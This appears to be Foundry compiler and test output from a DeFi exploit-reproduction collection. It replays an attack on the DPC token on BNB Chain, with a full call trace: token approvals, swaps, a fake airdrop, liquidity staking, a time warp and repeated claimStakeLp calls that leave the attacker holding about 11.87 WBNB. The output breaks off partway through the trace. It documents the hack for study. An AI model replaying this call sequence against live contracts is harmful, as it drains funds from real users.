Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (1878): SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing "SPDX-License-Identifier: <SPDX-License>" to each source file. Use "SPDX-License-Identifier: UNLICENSED" for non-open-source code. Please see https://spdx.org for more information.
Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing "SPDX-License-Identifier: <SPDX-License>" to each source file. Use "SPDX-License-Identifier: UNLICENSED" for non-open-source code. Please see https://spdx.org for more information.
--> src/test/2022-09/DPC_exp.sol

Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-09/DPC_exp.sol:22:5:
   |
22 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-09/DPC_exp.sol:23:5:
   |
23 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-09/DPC_exp.sol:41:9:
   |
41 |         address(WBNB).call{value: 2 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 247.03ms (336.30µs CPU time)

Ran 1 test for src/test/2022-09/DPC_exp.sol:ContractTest
[PASS] testExploit() (gas: 1231833)
Logs:
  [Start] Attacker WBNB balance before exploit: 0.000000000000000000
  [End] Attacker WBNB balance after exploit: 11.869629497407785960

Traces:
  [1345333] ContractTest::testExploit()
    ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker WBNB balance before exploit", val: 0, decimals: 18)
    ├─ [24711] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [24598] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::approve(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639679 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639679 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [21731] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::fallback{value: 2000000000000000000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 2000000000000000000 [2e18])
    │   └─ ← [Stop] 
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2000000000000000000 [2e18]
    ├─ [76674] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(2000000000000000000 [2e18], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662719563 [1.662e9])
    │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
    │   │   └─ ← [Return] 80655051981602918281434479 [8.065e25], 279158001838224320375056 [2.791e23], 1662719563 [1.662e9]
    │   ├─ [8948] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 2000000000000000000 [2e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 2000000000000000000 [2e18])
    │   │   └─ ← [Return] true
    │   ├─ [53864] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(576396441201225360309 [5.763e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [29971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 576396441201225360309 [5.763e20])
    │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 576396441201225360309 [5.763e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   └─ ← [Return] 80654475585161717056074170 [8.065e25]
    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   └─ ← [Return] 279160001838224320375056 [2.791e23]
    │   │   ├─ emit Sync(reserve0: 80654475585161717056074170 [8.065e25], reserve1: 279160001838224320375056 [2.791e23])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 2000000000000000000 [2e18], amount0Out: 576396441201225360309 [5.763e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [2000000000000000000 [2e18], 576396441201225360309 [5.763e20]]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 576396441201225360309 [5.763e20]
    ├─ [162723] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(288198220600612680154 [2.881e20], 0, [0x55d398326f99059fF775485246999027B3197955, 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662719563 [1.662e9])
    │   ├─ [2893] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::getReserves() [staticcall]
    │   │   └─ ← [Return] 107405331616969972002944 [1.074e23], 8250575885330425488143 [8.25e21], 1662719473 [1.662e9]
    │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x79cD24Ed4524373aF6e047556018b1440CF04be3, 288198220600612680154 [2.881e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, value: 288198220600612680154 [2.881e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039169385787312516959781 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [140607] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::swap(0, 22024281847148421630 [2.202e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [104805] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22024281847148421630 [2.202e19])
    │   │   │   ├─ emit Transfer(from: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 660728455414452648 [6.607e17])
    │   │   │   ├─ [17377] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662748363 [1.662e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000009
    │   │   │   ├─ emit Transfer(from: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, to: 0x000000000000000000000000000000000000dEaD, value: 440485636942968432 [4.404e17])
    │   │   │   ├─ emit Transfer(from: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20923067754791000548 [2.092e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 107693529837570584683098 [1.076e23]
    │   │   ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 8228551603483277066513 [8.228e21]
    │   │   ├─ emit Sync(reserve0: 107693529837570584683098 [1.076e23], reserve1: 8228551603483277066513 [8.228e21])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 288198220600612680154 [2.881e20], amount1In: 0, amount0Out: 0, amount1Out: 22024281847148421630 [2.202e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [288198220600612680154 [2.881e20], 22024281847148421630 [2.202e19]]
    ├─ [99250] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::tokenAirdrop(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 100)
    │   ├─ [638] 0x55d398326f99059fF775485246999027B3197955::allowance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE) [staticcall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 100000000000000000000 [1e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 115792089237316195423570985008687907853269984665640564039357584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x7402B515EfCFFA99035E37c3a60224f6bBF5f1d8, 70000000000000000000 [7e19])
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: 0x7402B515EfCFFA99035E37c3a60224f6bBF5f1d8, value: 70000000000000000000 [7e19])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 188198220600612680155 [1.881e20]
    ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 20923067754791000548 [2.092e19]
    ├─ [176210] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 188198220600612680155 [1.881e20], 20923067754791000548 [2.092e19], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662719563 [1.662e9])
    │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x55d398326f99059fF775485246999027B3197955, 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE) [staticcall]
    │   │   └─ ← [Return] 0x79cD24Ed4524373aF6e047556018b1440CF04be3
    │   ├─ [893] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::getReserves() [staticcall]
    │   │   └─ ← [Return] 107693529837570584683098 [1.076e23], 8228551603483277066513 [8.228e21], 1662719563 [1.662e9]
    │   ├─ [6034] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x79cD24Ed4524373aF6e047556018b1440CF04be3, 188198220600612680155 [1.881e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, value: 188198220600612680155 [1.881e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564038981187566711904279626 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [77769] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x79cD24Ed4524373aF6e047556018b1440CF04be3, 14379682532753401270 [1.437e19])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 287593650655068025 [2.875e17])
    │   │   ├─ [17377] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662748363 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000009
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 287593650655068025 [2.875e17])
    │   │   ├─ [17377] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662748363 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000009
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2f72fe7CB8784E6b34a62C1E71c9DF4D8451be02, value: 143796825327534012 [1.437e17])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, value: 13660698406115731206 [1.366e19])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039443204325380376238665 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [79659] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   │   ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 8242212301889392797719 [8.242e21]
    │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 31414125373459180 [3.141e16])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 48720538302956672656 [4.872e19])
    │   │   ├─ emit Sync(reserve0: 107881728058171197363253 [1.078e23], reserve1: 8242212301889392797719 [8.242e21])
    │   │   ├─ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 188198220600612680155 [1.881e20], amount1: 13660698406115731206 [1.366e19])
    │   │   └─ ← [Return] 48720538302956672656 [4.872e19]
    │   └─ ← [Return] 188198220600612680155 [1.881e20], 14379682532753401270 [1.437e19], 48720538302956672656 [4.872e19]
    ├─ [537] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 48720538302956672656 [4.872e19]
    ├─ [66328] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::stakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 48720538302956672656 [4.872e19])
    │   ├─ [655] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::allowance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE) [staticcall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [8376] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 48720538302956672656 [4.872e19])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 48720538302956672656 [4.872e19])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1662805963 [1.662e9])
    │   └─ ← [Return] 
    ├─ [69120] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [23203] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
